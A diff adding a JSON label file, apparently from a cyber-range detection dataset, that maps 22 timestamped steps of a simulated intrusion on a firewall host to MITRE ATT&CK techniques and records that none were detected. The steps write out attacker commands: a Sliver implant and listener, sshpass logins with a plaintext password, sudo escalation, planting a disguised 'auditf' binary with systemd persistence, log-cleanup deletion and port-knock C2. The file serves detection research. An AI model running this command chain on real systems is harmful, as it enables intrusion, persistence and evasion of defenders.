@@ -1,0 +1,220 @@
+{
+ "scenario": "scenario_4",
+ "victim": "inetfw",
+ "n_events": 16,
+ "files": [
+  {
+   "file": "<CAM-LDS>/s4/scenario_4/inetfw/logs/log/auth.log",
+   "kind": "auth",
+   "events": 16
+  }
+ ],
+ "steps": [
+  {
+   "ts": "2025-12-15T11:02:51+00:00",
+   "kind": "Sliver-command",
+   "cmd": "generate_implant",
+   "tech": "T1071.001",
+   "tactic": "Command and Control",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-15T11:03:19+00:00",
+   "kind": "Sliver-command",
+   "cmd": "start_https_listener",
+   "tech": "T1071.001",
+   "tactic": "Command and Control",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-15T11:03:35+00:00",
+   "kind": "Shell-Command",
+   "cmd": "sshpass -p 'rambo' scp -o StrictHostKeyChecking=no -o ProxyCommand=\"sshpass -p 'rambo' ssh -o StrictHostKeyChecking=no -",
+   "tech": "T1078.003,T1105,T1205.001",
+   "tactic": "Initial Access,Lateral Movement,Defense Evasion",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:04:05+00:00",
+   "kind": "SSH-Command",
+   "cmd": "id",
+   "tech": "T1078.003",
+   "tactic": "Initial Access",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-15T11:04:31+00:00",
+   "kind": "SSH-Command",
+   "cmd": "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@firewall.attackbed.local ",
+   "tech": "T1078.003",
+   "tactic": "Lateral Movement",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:04:56+00:00",
+   "kind": "SSH-Command",
+   "cmd": "rambo ",
+   "tech": "T1078.003",
+   "tactic": "Lateral Movement",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:05:13+00:00",
+   "kind": "SSH-Command",
+   "cmd": "sudo -i ",
+   "tech": "T1548.003",
+   "tactic": "Privilege Escalation",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:05:45+00:00",
+   "kind": "SSH-Command",
+   "cmd": "rambo ",
+   "tech": "T1548.003",
+   "tactic": "Privilege Escalation",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:06:01+00:00",
+   "kind": "SSH-Command",
+   "cmd": "sudo tar -xzf /tmp/auditf.tar.gz -C /usr/bin ",
+   "tech": "T1036.005,T1205.001",
+   "tactic": "Defense Evasion",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:06:16+00:00",
+   "kind": "SSH-Command",
+   "cmd": "rm /tmp/auditf.tar.gz ",
+   "tech": "T1070.004",
+   "tactic": "Defense Evasion",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:08:49+00:00",
+   "kind": "SSH-Command",
+   "cmd": "[Unit] Description=Run auditf on boot  [Service] ExecStart=/usr/bin/auditf WorkingDirectory=/usr/bin Restart=on-failure ",
+   "tech": "T1543.002",
+   "tactic": "Persistence",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-15T11:09:49+00:00",
+   "kind": "SSH-Command",
+   "cmd": ":wq! ",
+   "tech": "T1543.002",
+   "tactic": "Persistence",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:10:06+00:00",
+   "kind": "SSH-Command",
+   "cmd": "sudo systemctl daemon-reload ",
+   "tech": "T1543.002",
+   "tactic": "Persistence",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:10:26+00:00",
+   "kind": "SSH-Command",
+   "cmd": "sudo systemctl enable auditf.service ",
+   "tech": "T1543.002",
+   "tactic": "Persistence",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:10:45+00:00",
+   "kind": "SSH-Command",
+   "cmd": "sudo systemctl start auditf.service ",
+   "tech": "T1543.002",
+   "tactic": "Persistence",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:11:45+00:00",
+   "kind": "Shell-Command",
+   "cmd": "/home/aecid/knock-cli -c knock.yaml -r knock-firewall",
+   "tech": "T1205.001,T1071.001,T1036.005",
+   "tactic": "Defense Evasion,Persistence,Command and Control",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:12:05+00:00",
+   "kind": "Sliver-Session-command",
+   "cmd": "execute",
+   "tech": "T1599",
+   "tactic": "Defense Evasion",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-12-15T11:12:20+00:00",
+   "kind": "Sliver-Session-command",
+   "cmd": "execute",
+   "tech": "T1599",
+   "tactic": "Defense Evasion",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-15T11:12:36+00:00",
+   "kind": "SSH-Command",
+   "cmd": "id",
+   "tech": "T1078.003",
+   "tactic": "Initial Access",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-15T11:12:53+00:00",
+   "kind": "SSH-Command",
+   "cmd": "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@linuxshare.attackbed.local ",
+   "tech": "T1078.003",
+   "tactic": "Lateral Movement",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-15T11:13:13+00:00",
+   "kind": "SSH-Command",
+   "cmd": "rambo ",
+   "tech": "T1078.003",
+   "tactic": "Lateral Movement",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-15T11:13:30+00:00",
+   "kind": "SSH-Command",
+   "cmd": "hostname ",
+   "tech": "T1082",
+   "tactic": "Discovery",
+   "rules": [],
+   "visible": false
+  }
+ ],
+ "flag_before_attack": 0,
+ "flag_before_attack_rules": [],
+ "summary": {
+  "steps": 22,
+  "detected": 0,
+  "visible": 13,
+  "visible_detected": 0
+ }
+}
